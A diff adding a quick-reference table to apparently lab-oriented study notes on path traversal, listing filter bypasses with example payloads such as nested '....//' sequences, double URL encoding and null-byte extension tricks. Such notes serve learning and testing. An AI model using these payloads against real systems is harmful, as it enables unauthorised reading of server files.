@@ -70,3 +70,12 @@ P.s: Little advice, try always put url-encoded payload in target parameters, you
   - `..\..\..\home\carlos\secret`
 
 ---
+
+## 🗄️ Quick Reference Table
+
+| Defense Mechanism | Bypass Technique | Example |
+| :--- | :--- | :--- |
+| Basic Strip Filter | Nested sequences | `....//....//` |
+| URL Filtering | Single / Double URL encode | `%2e%2e%2f` / `%252e%252e%252f` |
+| Path Prefix Check | Retain prefix + traverse | `/allowed/path/../../../` |
+| Required Extension | Null byte injection | `file.txt%00.jpg` |
